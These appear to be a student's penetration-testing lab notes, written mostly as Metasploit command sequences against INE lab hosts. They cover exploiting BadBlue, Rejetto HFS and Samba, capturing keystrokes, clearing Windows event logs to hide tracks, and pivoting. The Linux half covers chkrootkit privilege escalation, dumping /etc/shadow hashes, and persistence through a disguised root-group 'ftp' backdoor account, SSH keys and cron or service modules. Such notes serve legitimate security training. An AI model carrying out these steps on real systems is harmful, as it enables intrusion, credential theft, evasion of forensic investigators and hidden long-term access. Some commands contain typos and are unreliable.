> db_nmap -sV -sS -O demo.ine.local  ## here badblue
> search badblue
> use exploit/windows/http/badblue_passthru
> options
> run # this will give a meterpreter shell
> getuid
> sysinfo
> pgrep explorer # it workers better on explorer process



# start capturing keystrokes
> keyscan_start
> keyscan_dump # start and dump again if it does not work properly

```

### Clearing Windows Event Logs
+ The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.
+ Event logs are categorized based on the type of events they store:
+ Application logs: Stores application/program events like startups, crashes etc.
+ System logs: Stores system events like startups, reboots etc.
+ Security logs: Stores security events like password changes, authentication failures etc.
+ Event logs can be accessed via the Event Viewer on Windows.
+ The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

```bash
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local 
> search badblue
> use exploit/windows/http/badblue_passthru
> set target BadBlue\ EE\ 2.7\ Universal
> options
> run # this will give a meterpreter shell
> sysinfo
> getuid


## IN THE EVENT VIEWER of target YOU CAN SEE THE LOGS
It does not seem suspicious

# lets get a shell on target
> shell
> net user administrator Password_123321 # password changed

# EVENT VIEWER 
## Gives detailed that a password has  been changed which we dont want to be known by the target so....

"ctrl+c" terminate the channel


# in meterpreter session
> clearv # to erase all the event logs

## delete the payload file
> rm/del etc

```

### Pivoting
+ Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network.
+ After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.
+ Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.

```bash
Victim 1--------->--------------->Attacker--------->--------------->Victim 2
192.168.1.3                       192.168.1.2                       10.10.10.3
                                  10.10.10.2
                                  
    Network: 192.168.1.0/24                      Network: 10.10.10.10/24

> ping target1 # okkk
> ping target2 # denied
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local # rejetto hfs
> use exploit/windows/http/rejetto_hfs_exec
> set RHOSTS target1
> run # meterpreter
> sysinfo 
> ifconfig # target1 ip
> run autoroute -s 10.2.12.0/20

"ctrl+z"
> sessions
> sessions -n target1 -i 1 # rename session to target1
> sessions # displays target1



## now use portscan modules to discover the vuln in other target
> search portscan
> use auxiliary/scanner/portscan/tcp
> set RHOST target2
> run # port 80 tcp info


NOTE: THE ROUTE WE HAVE ADDED IS ONLY APPLICABLE TO THE MSFCONSOLE 

We cannot run the nmap on the victim-2.. To perform that, we need to port forward the open port of the victim-2 to Local machine. {kali}

- Now our attacker machine port 1234 is connected to target-ip:80 port by port forwarding. 
    
- We can perform the nmap scan on the localhost and port 1234 to scan the 80 port of the target.


# port $forwarding in meterpreter session
> sessions -i 1
> portfwd add -l 1234 -p 80 -r demo2.ine.local # target2
> portfwd list

"ctrl+z"

## scan the port 80 which we connected to 1234 of localhost
> db_nmap -sV -sS -p 1234 localhost # tcpwrapped = badblue

> search badblue
> use exploit/windows/http/badblue_passthru
> set payload windows/meterpreter/bind_tcp 
> set rhosts target2-ip
> set LPORT 4433  # If you have any active sessions on port 4444. change it ! 

Now we have route added to the msfconsole we need not to change the target port to 1234. leave it to the port 80. 
> set target 1
> run



> shell
> cd /
> dir
> type flag.txt

```

## Linux Post Exploitation
### Linux Post Exploitation Modules
The MSF provides us with various post exploitation modules for both Windows and Linux.

We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
- Enumerate system configuration
- Enumerate environment variables
- Enumerate network configuration
- VM check
- Enumerate user history

```bash
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local # smd v3
> search type:exploit name:samba
> use exploit/linux/samba/is known pipename
> set RHOSTS demo.ine.local
> run # got the shell
> sessions -u 1 # upgrade the session to shell session
> sessions 2



### lets start with some local enumeration
> sysinfo
> getuid # uid=0 means root user
> shell
	/bin/bash -i
> whoami
> cat /etc/passwd
> groups root 
> cat /etc/*issue
> uname -r
> uname -a
> ip a s # list all the interfaces on the network
> netstat -antp
> ps aux
> env # enumerate env variable



#### Linux Gather Configurations
> "ctrl+c" terminate the channel
> search enum_configs
> use post/linux/gather/enum_configs
> set SESSION 2 # The session should be upgraded
> run # it will list  all the configuration


# to see the retireved info
> loot 
> cat /path/to/saved/file



# lets take a look at env variable module
> search env platform:linux
> use post/multi/gather/env
> set SESSION 2
> run # gives the actual version of linux


### Linux Gather Network Information
> search enum_network
> use post/linux/gather/enum_network
> options
> set SESSION 2
> run # gives the info about netork ## running lilnode 


## Linux Gather Protection Enumeration
> search enum_protections
> use post/linux/gather/enum_protections
> set SESSION 2
> run 
	## all of this will be saved in notes
	> notes
	


### Linux Gather System and User Information
> search enum_system
> use post/linux/gather/enum_system
> set SESSION 2
> run

> loot
> cat /path/to/saved/file


#### to check whether the sysetm in container or a vm
# Linux Gather Container Detection
> search checkcontainer
> use post/linux/gather/checkcontainer
> set SESSION 2
> run



# Linux Gather Virtual Environment Detection
> search checkvm
> use post/linux/gather/checkvm
> set SESSION 2
> run 



### Linux Gather User History
> search enum_users_history 
> use post/linux/gather/enum_users_history
> set SESSION 2
> run

> loot

```

### Linux Privilege Escalation: Exploiting A Vulnerable Program
The privilege escalation techniques we can utilize will depend on the version of the Linux kernel running on the target system as well as the distribution release version.

MSF offers very little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges.
```bash

## here in this lab we already have SSH creds
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local # 22 SSH

## already have ssh crds no need to brute force for creds
> search ssh_login
> use auxiliary/scanner/ssh/ssh_login ## ssh login checker
> options
> set USERNAME user
> set PASSWORD pass
> run
> sessions
> session 1
> pwd
> /bin/bash -i # to get a proper shell
> whoami
> cat/etc/*issue



## here we want to upgrade a cmd session to meterpreter session
> background
> sessions -u 1 # dont worry even if its give error
> sessions 2

# meterpreter
> sysinfo
> getuid
> shell
	> /bin/bash -i
	
> cat /etc/passwd


## we want to elevate our privs to root user
> ps aux

# we saw the user has initiated a binary that is utilitising /bin/bash with dir /bin/check-down
# let see what this binary does
> cat /bin/check-down # its a bash script

	#!/bin/bash
	while
	do
		/usr/local/bin/chkrootkit/chkrootkit -x > /dev/null
		sleep 60
	done 
	# the chkrootkit is executed every 60 sec 
	# chkrootkit is a linux utility to check the system for any rootkit 



# check if chkrootkit is vuln or not
> chkrootkit --help
> chkrootkit -V # version 0.49 vuln
	# terminate the channel


# meterpreter
### Chkrootki# Local Privilege Escalation
> search chkrootkit
> use exploit/unix/local/chkrootkit
> options # set payload if needed
> set CHKROOTKIT /bin/chkroot
> set SESSION 2 # can work on boht normak and upgraded session
> set LHOST eht1/ip
> run #


# got normal shell
> /bin/bash -i
> whoami
> 

```

### Dumping Hashes With Hashdump
We can dump Linux user hashes with the hashdump post exploitation module. Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.

The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John the Ripper.

```bash
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local # SMB 
> search samba type:exploit
> use exploit/linux/samba/is_known_pipename
> options
> run # got a cmd seession
> sessions -u 1 # got meterpreter session
> hashdump # unknown cmd

# get info on target
> getuid
> sysinfo 
> background
> search hashdump
> use post/linux/gather/hashdump
> options
> set SESSION 2
> run # file saved
> loot
> cat pathtofile/SHADOW.txt


############### additional things you can  do #########################

## to check if they work
> session 2
> shell
> /bin/bash -i


## changing the password for "root"
> passwd root
	> password123 # new passord


# add a user
> useradd -m alexis -s /bin/bash

## changing the password for "alexis"
> passwd alexis
	> password321 # new passord
	
$kill the session 

And u can check the $loot to check the changes passowrd or
'In the post/linux/gather/hashdump' run the module again to get the chnaged hashes or addusers usernames

```

### Establishing Persistence On Linux
Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

The persistence techniques we can utilize will depend on the target configuration. We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

```bash
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local # ssh
## already have ssh crds no need to brute force for creds
> search ssh_login
> use auxiliary/scanner/ssh/ssh_login ## ssh login checker
> options
> set USERNAME user
> set PASSWORD pass
> run 
> sessions
> sessions -u 1
> sessions
> ps aux 

"Terminate the channel"

$NOTE make sure no conflicting LPORT is there & set LHOST as needed

As we saw in the $chkrootkit the machine is vuln to chkrootkit 
so we will directly go for that....
> search chkrootkit
> use exploit/unix/local/chkrootkit
> options
> set CHKROOTKIT /bin/chkrootkit # path to rootkit
> set LHOST ourip
> set LPORT port # if default if busy
> run # or set payload
> sessions 
> sessions -u 3
> sessions 4

$FROM here you can directly go to $perssistence_modules



$$$$$$$$$$$$$$$$$$$$ This Might be used or not $$$$$$$$$$$$$$$$$$$$$$$$ 
"Terminate the channel"
Now to get the accces whenever we want...... We can use a backdoor

# in meterpreter we can add user account with root privs to setup the backdoor
> getuid
> shell
	/bin/bash -i
> whoami #root
> cat /etc/passwd # see the other usernames

Make it seem  like a service account
> adduser -m ftp -s /bin/bash # most of the user will be at /usr/sbin/nologin
> passwd ftp
	"password123"
> groups root # see the root groups
> usermod -aG root ftp # add ftp to root group
> groups ftp # verify that ftp is added to root groups

To avoid further detections
> usermod -u 15 ftp # channge uid for ftp account
> cat /etc/passwd # uid changed 






$perssistence_modules
################### LETS TAKE A LOOK AT PERSISTENSE MODULES #####################
> search platform:linux persistence 

# here is a few of those
> use post/linux/manage/sshkey_persistence # most recommended

'This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.......... We already added a $ftp_account above'

> options
> set CREATESSHFOLDER true
> set session 4
> run
> loot # to access the private key

> exit # terminate all sessions even the msfconsole is closed

# in bash shell
> nano ssh_key # copy the in that 
> chmod 0400 ssh_key
> ssh -i ssh_key root@targetip
	# we got the shell access and very good
> ssh -i ssh_key ftp@targetip # logged in as FTP user


> use exploit/linux/local/cron_persistence # recommended
> use exploit/linux/local/apt_package_manager_persistence
> use exploit/linux/local/service_persistence # may be needed set payload cmd/unix/reverse_python "set target 3"

> set session 4 
> run

```

----

# Armitage
## Metasploit GUIs
### Port Scanning & Enumeration With Armitage
Armitage is a free Java based GUI front-end for the Metasploit Framework developed by Raphael Mudge and is used to simplify network discovery, exploitation and post exploitation.

Armitage provides you with the following functionality:
- Visualizes targets
- Automate port scanning
- Automate exploitation
- Automate post exploitation
Armitage requires the Metasploit Framework database and the Metasploit backend services to be enabled and running in order to function correctly.

Armitage comes pre-packaged with Kali Linux and other penetration testing distributions.
```bash
> service postgresql start
> service postgresql status

> armitage # or start from the menu
	Pops a window with default creds

Graph view # recommended
Attack # dont do anything here if u just starting the armitage

$$$$$$$$$ SEE THE NOTION LAB NOTES FOR BETTER UNDERSTANDING $$$$$$$$$$$
>hosts>add host>ip

>host>right click>services etc 

Close the tabs once you are done with them 
As armitage is made on java it can be slow


```

### Exploitation & Post Exploitation With Armitage
SEE THE NOTION LAB NOTES FOR BETTER UNDERSTANDING 
